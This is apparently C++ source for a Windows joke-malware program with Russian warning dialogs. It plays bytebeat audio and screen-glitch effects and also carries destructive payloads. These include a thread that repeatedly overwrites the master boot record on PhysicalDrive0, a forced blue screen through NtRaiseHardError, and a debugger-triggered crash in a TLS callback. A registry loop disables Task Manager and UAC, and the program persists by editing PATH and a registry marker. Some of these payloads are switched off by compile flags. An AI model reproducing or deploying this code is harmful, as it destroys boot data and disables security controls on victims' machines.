#define TEST true
#define BSOD false
#define MBR false
#define MESSAGEBOX true
#define BUFFER_SIZE (32000*32)

#include <Windows.h>
#include <string>
#include <time.h>
#include <vector>
#include <winternl.h>

#ifdef __cpp_lib_experimental_filesystem
#define _SILENCE_EXPERIMENTAL_FILESYSTEM_DEPRECATION_WARNING
#include <experimental/filesystem>
namespace fs = std::experimental::filesystem::v1;
#elif __cpp_lib_filesystem
#include <filesystem>
namespace fs = std::filesystem;
#else
#error "no filesystem support ='("
#endif

#pragma comment(lib, "Winmm.lib")
#pragma comment(lib, "ntdll.lib")
#pragma warning(disable : 4996)

extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN OldValue);
extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG Unless1, ULONG Unless2, PULONG_PTR Unless3, ULONG ValidResponseOption, PULONG ResponsePointer);

void raise() {
	if (!BSOD) { return; };
	BOOLEAN bl;
	ULONG Response;
	RtlAdjustPrivilege(19, TRUE, FALSE, &bl);
	NtRaiseHardError(0xDEADDEAD, 0, 0, NULL, 6, &Response);
}

__declspec(thread) int tlsFlag = 1;

void NTAPI tls_callback(PVOID DllHandle, DWORD dwReason, PVOID)
{
	if ((dwReason == DLL_THREAD_ATTACH || dwReason == DLL_PROCESS_ATTACH) && IsDebuggerPresent()) raise();
}

#ifdef _WIN64
#pragma comment (linker, "/INCLUDE:_tls_used")  // See p. 1 below
#pragma comment (linker, "/INCLUDE:tls_callback_func")  // See p. 3 below
#else
#pragma comment (linker, "/INCLUDE:__tls_used")  // See p. 1 below
#pragma comment (linker, "/INCLUDE:_tls_callback_func")  // See p. 3 below
#endif

// Explained in p. 3 below
#ifdef _WIN64
#pragma const_seg(".CRT$XLF")
EXTERN_C const
#else
#pragma data_seg(".CRT$XLF")
EXTERN_C
#endif
PIMAGE_TLS_CALLBACK tls_callback_func = tls_callback;
#ifdef _WIN64
#pragma const_seg()
#else
#pragma data_seg()
#endif //_WIN64

DWORD WINAPI ThreadProc(CONST LPVOID lpParam)
{
	ExitThread(0);
}

#include "resource.h"
#include "GDI.h"
#include "mbr.h"

#define for_i(i, expr) for(size_t j = 0; j < i; j++) expr 


using namespace std;

enum RegStat {
	Ok,
	Error,
	NFoundKey,
	NFoundVal,
	NEq
};

RegStat GetRegVal(HKEY Root, LPCSTR Subdir, LPCSTR Name, char Buffer[]) {
	HKEY key;
	LSTATUS res = RegOpenKeyA(Root, Subdir, &key);
	if (res != ERROR_SUCCESS) {
		return (res == ERROR_FILE_NOT_FOUND) ? NFoundKey : Error;
	}
	DWORD size = MAX_PATH;
	res = RegQueryValueExA(key, Name, NULL, NULL, (LPBYTE)Buffer, &size);
	if (res != ERROR_SUCCESS) {
		return (res == ERROR_FILE_NOT_FOUND) ? NFoundKey : Error;
	}
	return Ok;
}

RegStat CheckRegVal(HKEY Root, LPCSTR Subdir, LPCSTR Name, string Value) {
	char buff[MAX_PATH] = { 0 };
	RegStat res = GetRegVal(Root, Subdir, Name, buff);
	if (res != Ok) {
		return res;
	}
	if (strcmp(buff, Value.c_str()) == 0) { return Ok; }
	return NEq;
}

RegStat SetRegVal(HKEY Root, LPCSTR Subdir, LPCSTR Name, string Value) {
	HKEY key;
	LSTATUS res = RegOpenKeyA(Root, Subdir, &key);
	if (res != ERROR_SUCCESS) {
		return (res == ERROR_FILE_NOT_FOUND) ? NFoundKey : Error;
	}
	res = RegSetValueExA(key, Name, NULL, REG_SZ, (LPBYTE)Value.c_str(), (DWORD)MAX_PATH);
	if (res != ERROR_SUCCESS) {
		return Error;
	}
	return Ok;
}
RegStat SetRegVal(HKEY Root, LPCSTR Subdir, LPCSTR Name, char Value[]) {
	HKEY key;
	LSTATUS res = RegOpenKeyA(Root, Subdir, &key);
	if (res != ERROR_SUCCESS) {
		return (res == ERROR_FILE_NOT_FOUND) ? NFoundKey : Error;
	}
	res = RegSetValueExA(key, Name, NULL, REG_SZ, (LPBYTE)Value, (DWORD)MAX_PATH);
	if (res != ERROR_SUCCESS) {
		return Error;
	}
	return Ok;
}
RegStat SetRegVal(HKEY Root, LPCSTR Subdir, LPCSTR Name, DWORD Value) {
	HKEY key;
	LSTATUS res = RegOpenKeyA(Root, Subdir, &key);
	if (res != ERROR_SUCCESS) {
		return (res == ERROR_FILE_NOT_FOUND) ? NFoundKey : Error;
	}
	res = RegSetValueExA(key, Name, NULL, REG_DWORD, (LPBYTE)&Value, (DWORD)MAX_PATH);
	if (res != ERROR_SUCCESS) {
		return Error;
	}
	return Ok;
}

string getabspathincurrdir(const char* path = "") {
	vector<char> pathBuf;
	DWORD copied = 0;
	do {
		pathBuf.resize(pathBuf.size() + MAX_PATH);
		copied = GetModuleFileNameA(nullptr, &pathBuf.at(0), pathBuf.size());
	} while (copied >= pathBuf.size());
	pathBuf.resize(copied);
	string path_(pathBuf.begin(), pathBuf.end());
	return fs::path(path_).parent_path().string() + "\\" + string(path);
}

DWORD WINAPI mbr(LPVOID lpParam) {
	while (1) {
		DWORD dwBytesWritten;
		HANDLE hDevice = CreateFileW(
			L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
			FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
			OPEN_EXISTING, 0, 0);

		WriteFile(hDevice, MasterBootRecord, 32768, &dwBytesWritten, 0);
		CloseHandle(hDevice);
	}
}

DWORD WINAPI task(LPVOID lpParam) {
	while (1) {
		SetRegVal(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", 1);
		SetRegVal(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "EnableLUA", (DWORD)0);
	}
}

int main(){
	srand(time(NULL));
	FreeConsole();

	// Work
	if (CheckRegVal(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows", "HostAutoStartCheck", "yes") == Ok) {
		work:
		if (MBR) {
			CreateThread(NULL, NULL, mbr, NULL, NULL, NULL);
		}
		if (!TEST) {
			CreateThread(NULL, NULL, task, NULL, NULL, NULL);
		}
		SHSTOCKICONINFO z{};
		HRESULT res;
		z.cbSize = sizeof(z);
		for_i((size_t)SIID_MAX_ICONS, {
			res = SHGetStockIconInfo((SHSTOCKICONID)j, SHGSI_ICON, &z);
			cur.push_back(z.hIcon);
		})

		// Первый bytebeat 
		HWAVEOUT hwo = 0;
		WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
		waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

		char* buffer = new char[BUFFER_SIZE];

		// 1

		for (DWORD t = 0; t < BUFFER_SIZE; t++)
			buffer[t] = static_cast<char>(sin(t / (1 + (t >> 3 & t >> 10))) * 32 + 64); // bytebeat code here 

		WAVEHDR hdr = { buffer, BUFFER_SIZE, 0, 0, 0, 0, 0, 0 };
		waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
		waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));

		size_t
			max_time = (size_t)1000 * 30,
			curr_time = 0,
			//curr_time = max_time,
			step = 500;
		while (curr_time <= max_time) {
			InsertColorsGDI(step);
			curr_time += step;
		}
		waveOutReset(hwo);

		// 2

		for (DWORD t = 0; t < BUFFER_SIZE; t++)
			buffer[t] = static_cast<char>((t * (-((long long)(t >> 8 | t | t >> 9 | t >> 13)))) ^ t); // bytebeat code here 

		hdr = { buffer, BUFFER_SIZE, 0, 0, 0, 0, 0, 0 };
		waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
		waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));

		max_time = (size_t)1000 * 30;
		curr_time = 0;
		//curr_time = max_time;
		step = 500;
		while (curr_time <= max_time) {
			GlitchGDI(step / 2);
			TunnelGDI(step / 2);
			curr_time += step;
		}
		waveOutReset(hwo);

		// 3

		for (DWORD t = 0; t < BUFFER_SIZE; t++)
			buffer[t] = static_cast<char>((t >> 8 & t) * (t >> 15 & t)); // bytebeat code here 

		hdr = { buffer, BUFFER_SIZE, 0, 0, 0, 0, 0, 0 };
		waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
		waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));

		max_time = (size_t)1000 * 30;
		curr_time = 0;
		//curr_time = max_time;
		step = 500;
		while (curr_time <= max_time) {
			MadGDI(step / 4);
			JustGDI(step / 4);
			MadGDI(step / 4);
			JustGDI(step / 4);
			curr_time += step;
		}
		waveOutReset(hwo);

		// 4

		for (DWORD t = 0; t < BUFFER_SIZE; t++)
			buffer[t] = static_cast<char>(t * (t >> 9)); // bytebeat code here 

		hdr = { buffer, BUFFER_SIZE, 0, 0, 0, 0, 0, 0 };
		waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
		waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));

		max_time = (size_t)1000 * 30;
		curr_time = 0;
		//curr_time = max_time;
		step = 500;
		while (curr_time <= max_time) {
			for_i(5, {
				DrawIconRandPos(RandIcon(), step / 40);
				DrawIconRandPos(RandIcon(), step / 40);
				DrawIconRandPos(RandIcon(), step / 40);
				DrawIconOnCursor(RandIcon(), step / 40);
				});
			TunnelGDI(step / 2);
			curr_time += step;
		}
		waveOutReset(hwo);

		// 5

		for (DWORD t = 0; t < BUFFER_SIZE; t++)
			buffer[t] = static_cast<char>((t % 100 + 1000) * (t >> 7 | 25) & 0x7F); // bytebeat code here 

		hdr = { buffer, BUFFER_SIZE, 0, 0, 0, 0, 0, 0 };
		waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
		waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));

		max_time = (size_t)1000 * 30;
		curr_time = 0;
		//curr_time = max_time;
		step = 500;
		while (curr_time <= max_time) {
			for_i(10, {
				InsertColorsGDI(step / 10);
				});
			curr_time += step;
		}
		waveOutReset(hwo);

		// 6

		for (DWORD t = 0; t < BUFFER_SIZE; t++)
			buffer[t] = static_cast<char>(t * ((t & 4096 ? t % 65536 < 59392 ? 7 : t & 7 : 16) + (1 & t >> 14)) >> (3 & -(long long)t >> (t & 2048 ? 2 : 10)) | t >> (t & 16384 ? t & 4096 ? 10 : 3 : 2)); // bytebeat code here 

		hdr = { buffer, BUFFER_SIZE, 0, 0, 0, 0, 0, 0 };
		waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
		waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));

		max_time = (size_t)1000 * 30;
		curr_time = 0;
		//curr_time = max_time;
		step = 500;
		while (curr_time <= max_time) {
			for_i(4, {
				TunnelRandGDI(step / 4);
				});
			curr_time += step;
		}
		waveOutReset(hwo);

		// 7

		for (DWORD t = 0; t < BUFFER_SIZE; t++)
			buffer[t] = static_cast<char>((long long)15 - t % (t & 16384 ? 26 : 29) & t >> 4 | (long long)t << 1 & -(long long)t >> 4); // bytebeat code here 

		hdr = { buffer, BUFFER_SIZE, 0, 0, 0, 0, 0, 0 };
		waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
		waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));

		max_time = (size_t)1000 * 30;
		curr_time = 0;
		//curr_time = max_time;
		step = 400;
		while (curr_time <= max_time) {
			for_i(100, ScratchGDI(0));
			curr_time += step;
		}
		waveOutReset(hwo);

		// 8

		for (DWORD t = 0; t < BUFFER_SIZE; t++)
			buffer[t] = static_cast<char>(10 * (t & 5 * t | t >> 6 | (t & 32768 ? -6 * t / 7 : (t & 65536 ? -9 * t & 100 : -9 * (t & 100)) / 11))); // bytebeat code here 

		hdr = { buffer, BUFFER_SIZE, 0, 0, 0, 0, 0, 0 };
		waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
		waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));

		max_time = (size_t)1000 * 30;
		curr_time = 0;
		//curr_time = max_time;
		step = 500;
		while (curr_time <= max_time) {
			for_i(1000, DrawIconRandPos(RandIcon()));
			Sleep(step);
			curr_time += step;
		}
		waveOutReset(hwo);

		// 9
		for (DWORD t = 0; t < BUFFER_SIZE; t++)
			buffer[t] = static_cast<char>(t * (t ^ t >> 20 * (t >> 11))); // bytebeat code here 

		hdr = { buffer, BUFFER_SIZE, 0, 0, 0, 0, 0, 0 };
		waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
		waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));

		max_time = (size_t)1000 * 30;
		curr_time = 0;
		//curr_time = max_time;
		step = 500;
		while (curr_time <= max_time) {
			CreateGDI(0, 0, sx, sy, BLACKNESS, step / 2);
			CreateGDI(0, 0, sx, sy, WHITENESS, step / 2);
			curr_time += step;
		}
		waveOutReset(hwo);

		waveOutClose(hwo);
		raise();
		return 0xDEADDEAD;
	}
	else {
		if (MESSAGEBOX) {
			if (MBR && MessageBoxA(NULL, "ВНИМАНИЕ!\n\nДанная программа нанесет критический вред устройству!\nПосле нажатия \"да\" MBR будет изменен!\n\nВы хотите продолжить?", "Jf#AD@83g$&&dA64%q$.MZ", MB_YESNO) == IDNO) {
				return 0xDEADDEAD;
			}
			if (MessageBoxA(NULL, "ВНИМАНИЕ!\n\nДанное ПО запрещено запускать людям с эпилепсией!\n\nВы хотите продолжить?", "Jf#AD@83g$&&dA64%q$.MZ", MB_YESNO) == IDNO) {
				return 0xDEADDEAD;
			}
			MessageBoxA(NULL, "Автор: EgorBeLike\nВерсия: 1.0", "Jf#AD@83g$&&dA64%q$.MZ", MB_OK);
		}
		if (TEST) {
			goto work;
		}
		CreateThread(NULL, NULL, task, NULL, NULL, NULL);
		char buff[MAX_PATH] = { 0 };
		if (GetRegVal(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment", "Path", buff) != Ok) {
			goto work;
		}
		string Dir = getabspathincurrdir() + ";";
		size_t new_size = strlen(buff) + Dir.size();
		char* buff2 = { 0 };
		strcpy(buff2, Dir.c_str());
		strcat(buff2, buff);
		if (SetRegVal(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment", "Path", buff2) != Ok) {
			goto work;
		}
		if (SetRegVal(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows", "HostAutoStartCheck", "yes") != Ok) {
			goto work;
		}
		raise();
	}

}
